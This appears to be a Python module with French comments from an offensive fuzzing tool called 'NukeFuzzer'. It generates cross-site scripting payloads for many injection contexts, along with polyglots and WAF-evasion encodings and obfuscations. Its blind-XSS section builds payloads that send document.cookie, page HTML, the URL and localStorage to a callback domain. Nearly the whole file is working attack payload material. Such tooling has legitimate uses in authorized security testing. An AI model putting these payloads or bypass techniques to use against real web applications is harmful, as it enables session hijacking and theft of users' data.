#!/usr/bin/env python3
"""
Module de payloads XSS avancés pour NukeFuzzer v2.0
Contient des techniques d'évasion WAF et des payloads contextuels
"""

import base64
import urllib.parse
import random
import string

class AdvancedXSSPayloads:
    """Classe pour génerer des payloads XSS avancés"""
    
    def __init__(self):
        self.basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<input autofocus onfocus=alert("XSS")>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(\'XSS\')">'
        ]
        
        self.context_payloads = {
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\'',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '\' onfocus=\'alert("XSS")\' autofocus=\'',
                '" onblur="alert(\'XSS\')" autofocus="',
                '" onchange="alert(\'XSS\')"',
                '" oninput="alert(\'XSS\')"',
                '" onkeydown="alert(\'XSS\')"',
                '" onkeyup="alert(\'XSS\')"',
                '" onload="alert(\'XSS\')"'
            ],
            'javascript': [
                'alert("XSS")',
                'confirm("XSS")',
                'prompt("XSS")',
                'eval("alert(\\"XSS\\")")',
                'Function("alert(\\"XSS\\")")()',
                'setTimeout("alert(\\"XSS\\")",1)',
                'setInterval("alert(\\"XSS\\")",1)',
                'window["alert"]("XSS")',
                'top["alert"]("XSS")',
                'parent["alert"]("XSS")',
                'self["alert"]("XSS")',
                'this["alert"]("XSS")',
                'frames["alert"]("XSS")',
                'globalThis["alert"]("XSS")'
            ],
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")>',
                '<embed src=javascript:alert("XSS")>',
                '<object data=javascript:alert("XSS")>',
                '<applet code=javascript:alert("XSS")>',
                '<meta http-equiv=refresh content=0;url=javascript:alert("XSS")>',
                '<base href=javascript:alert("XSS")//>',
                '<link rel=stylesheet href=javascript:alert("XSS")>'
            ],
            'dom': [
                'document.write("<script>alert(\\"XSS\\")</script>")',
                'document.body.innerHTML="<img src=x onerror=alert(\\"XSS\\")>"',
                'document.createElement("script").src="data:text/javascript,alert(\\"XSS\\")"',
                'document.cookie="<script>alert(\\"XSS\\")</script>"',
                'location.href="javascript:alert(\\"XSS\\")"',
                'location.hash="<script>alert(\\"XSS\\")</script>"',
                'location.search="<script>alert(\\"XSS\\")</script>"',
                'window.name="<script>alert(\\"XSS\\")</script>"',
                'document.referrer="<script>alert(\\"XSS\\")</script>"',
                'document.URL="<script>alert(\\"XSS\\")</script>"'
            ]
        }
        
        self.waf_bypass_techniques = {
            'case_variation': lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            'space_variations': lambda x: x.replace(' ', random.choice(['\t', '\n', '\r', '\f', '\v', '/**/'])),
            'quote_variations': lambda x: x.replace('"', random.choice(["'", '`', '\\x22', '\\u0022'])),
            'comment_insertion': lambda x: x.replace('>', random.choice(['><!--', '>/**/', '>/*comment*/'])),
            'double_encoding': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'hex_encoding': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'unicode_encoding': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'decimal_encoding': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'octal_encoding': lambda x: ''.join(f'\\{ord(c):03o}' for c in x),
            'base64_encoding': lambda x: base64.b64encode(x.encode()).decode()
        }
        
        self.polyglot_payloads = [
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(String.fromCharCode(88,83,83))//',
            '"><svg/onload=alert(/XSS/)>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>',
            '"><img src=x onerror=alert(\'XSS\')>',
            '\\\';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>',
            '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>',
            '"><iframe src=javascript:alert(\'XSS\')>',
            '\\\';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>'
        ]
    
    def generate_context_aware_payload(self, context='html', base_payload=None):
        """Génère un payload adapté au contexte"""
        if base_payload is None:
            base_payload = random.choice(self.basic_payloads)
        
        if context in self.context_payloads:
            return random.choice(self.context_payloads[context])
        return base_payload
    
    def apply_waf_bypass(self, payload, technique=None):
        """Applique une technique d'évasion WAF"""
        if technique is None:
            technique = random.choice(list(self.waf_bypass_techniques.keys()))
        
        if technique in self.waf_bypass_techniques:
            return self.waf_bypass_techniques[technique](payload)
        return payload
    
    def generate_encoded_payloads(self, payload):
        """Génère des versions encodées du payload"""
        encoded_payloads = []
        
        # URL encoding
        encoded_payloads.append(urllib.parse.quote(payload))
        encoded_payloads.append(urllib.parse.quote(payload, safe=''))
        
        # Double URL encoding
        encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # HTML entity encoding
        encoded_payloads.append(''.join(f'&#{ord(c)};' for c in payload))
        encoded_payloads.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # Base64 encoding
        encoded_payloads.append(base64.b64encode(payload.encode()).decode())
        
        # Hex encoding
        encoded_payloads.append(''.join(f'\\x{ord(c):02x}' for c in payload))
        
        # Unicode encoding
        encoded_payloads.append(''.join(f'\\u{ord(c):04x}' for c in payload))
        
        return encoded_payloads
    
    def generate_obfuscated_payloads(self, payload):
        """Génère des versions obfusquées du payload"""
        obfuscated_payloads = []
        
        # Case variation
        obfuscated_payloads.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
        
        # Space variations
        space_chars = ['\t', '\n', '\r', '\f', '\v', '/**/', '+', '%20', '%09', '%0a', '%0c', '%0d']
        for space_char in space_chars:
            obfuscated_payloads.append(payload.replace(' ', space_char))
        
        # Quote variations
        quote_variations = ["'", '`', '\\x22', '\\u0022', '&quot;', '&#34;', '&#x22;']
        for quote_var in quote_variations:
            obfuscated_payloads.append(payload.replace('"', quote_var))
        
        # Comment insertion
        comment_insertions = ['/**/', '<!--', '-->', '/*comment*/', '//comment']
        for comment in comment_insertions:
            obfuscated_payloads.append(payload.replace('>', f'>{comment}'))
        
        return obfuscated_payloads
    
    def generate_blind_xss_payloads(self, callback_domain='burpcollaborator.net'):
        """Génère des payloads pour blind XSS"""
        blind_payloads = []
        
        # Payloads basiques
        blind_payloads.extend([
            f'<script>fetch("http://{callback_domain}/?blind="+document.domain)</script>',
            f'<img src=x onerror=fetch("http://{callback_domain}/?blind="+document.domain)>',
            f'<svg onload=fetch("http://{callback_domain}/?blind="+document.domain)>',
            f'<iframe src=javascript:fetch("http://{callback_domain}/?blind="+document.domain)>',
            f'<script>new Image().src="http://{callback_domain}/?blind="+document.domain</script>',
            f'<script>navigator.sendBeacon("http://{callback_domain}/?blind="+document.domain)</script>',
            f'<script>document.body.appendChild(document.createElement("script")).src="http://{callback_domain}/?blind="+document.domain</script>'
        ])
        
        # Payloads avec exfiltration de données
        blind_payloads.extend([
            f'<script>fetch("http://{callback_domain}/?cookie="+document.cookie)</script>',
            f'<script>fetch("http://{callback_domain}/?html="+encodeURIComponent(document.innerHTML))</script>',
            f'<script>fetch("http://{callback_domain}/?url="+encodeURIComponent(location.href))</script>',
            f'<script>fetch("http://{callback_domain}/?storage="+encodeURIComponent(JSON.stringify(localStorage)))</script>'
        ])
        
        return blind_payloads
    
    def generate_dom_xss_payloads(self):
        """Génère des payloads pour DOM XSS"""
        dom_payloads = []
        
        # Payloads basés sur les sources DOM
        dom_sources = [
            'location.href',
            'location.search',
            'location.hash',
            'location.pathname',
            'document.URL',
            'document.baseURI',
            'document.documentURI',
            'document.referrer',
            'window.name',
            'document.cookie'
        ]
        
        for source in dom_sources:
            dom_payloads.extend([
                f'<script>{source}="javascript:alert(\'DOM-XSS\')"</script>',
                f'<script>eval({source})</script>',
                f'<script>setTimeout({source},1)</script>',
                f'<script>setInterval({source},1)</script>',
                f'<script>Function({source})()</script>'
            ])
        
        return dom_payloads
    
    def generate_all_payloads(self, limit=100):
        """Génère tous les types de payloads"""
        all_payloads = []
        
        # Payloads basiques
        all_payloads.extend(self.basic_payloads)
        
        # Payloads contextuels
        for context_type in self.context_payloads:
            all_payloads.extend(self.context_payloads[context_type])
        
        # Payloads polyglot
        all_payloads.extend(self.polyglot_payloads)
        
        # Payloads obfusqués
        for payload in self.basic_payloads[:5]:  # Limite pour éviter trop de payloads
            all_payloads.extend(self.generate_obfuscated_payloads(payload))
            all_payloads.extend(self.generate_encoded_payloads(payload))
        
        # Payloads DOM XSS
        all_payloads.extend(self.generate_dom_xss_payloads())
        
        # Payloads Blind XSS
        all_payloads.extend(self.generate_blind_xss_payloads())
        
        # Limite le nombre de payloads retournés
        if len(all_payloads) > limit:
            all_payloads = random.sample(all_payloads, limit)
        
        return list(set(all_payloads))  # Supprime les doublons
    
    def detect_context(self, response_text, payload_position):
        """Détecte le contexte d'injection basé sur la réponse"""
        context = 'html'  # par défaut
        
        # Vérification des contextes
        if f'value="{payload_position}"' in response_text or f"value='{payload_position}'" in response_text:
            context = 'attribute'
        elif f'<script>' in response_text and payload_position in response_text:
            context = 'javascript'
        elif f'document.' in response_text and payload_position in response_text:
            context = 'dom'
        
        return context
    
    def generate_custom_payload(self, context='html', encoding=None, obfuscation=None):
        """Génère un payload personnalisé selon les paramètres"""
        # Sélection du payload de base
        base_payload = self.generate_context_aware_payload(context)
        
        # Application de l'obfuscation
        if obfuscation:
            base_payload = self.apply_waf_bypass(base_payload, obfuscation)
        
        # Application de l'encodage
        if encoding:
            if encoding == 'url':
                base_payload = urllib.parse.quote(base_payload)
            elif encoding == 'html':
                base_payload = ''.join(f'&#{ord(c)};' for c in base_payload)
            elif encoding == 'base64':
                base_payload = base64.b64encode(base_payload.encode()).decode()
            elif encoding == 'hex':
                base_payload = ''.join(f'\\x{ord(c):02x}' for c in base_payload)
        
        return base_payload


# Fonction utilitaire pour utiliser le générateur
def get_advanced_xss_payloads(count=50):
    """Fonction utilitaire pour obtenir des payloads XSS avancés"""
    generator = AdvancedXSSPayloads()
    return generator.generate_all_payloads(count)


if __name__ == "__main__":
    # Test du générateur
    generator = AdvancedXSSPayloads()
    
    print("=== Test du générateur de payloads XSS avancés ===")
    
    # Test des payloads basiques
    print("\n1. Payloads basiques:")
    for i, payload in enumerate(generator.basic_payloads[:5]):
        print(f"  {i+1}. {payload}")
    
    # Test des payloads contextuels
    print("\n2. Payloads contextuels (HTML):")
    for i, payload in enumerate(generator.context_payloads['html'][:5]):
        print(f"  {i+1}. {payload}")
    
    # Test des payloads polyglot
    print("\n3. Payloads polyglot:")
    for i, payload in enumerate(generator.polyglot_payloads[:3]):
        print(f"  {i+1}. {payload}")
    
    # Test des payloads obfusqués
    print("\n4. Payloads obfusqués:")
    test_payload = '<script>alert("XSS")</script>'
    obfuscated = generator.generate_obfuscated_payloads(test_payload)
    for i, payload in enumerate(obfuscated[:5]):
        print(f"  {i+1}. {payload}")
    
    # Test des payloads encodés
    print("\n5. Payloads encodés:")
    encoded = generator.generate_encoded_payloads(test_payload)
    for i, payload in enumerate(encoded[:5]):
        print(f"  {i+1}. {payload}")
    
    print(f"\nTotal de payloads générés: {len(generator.generate_all_payloads())}")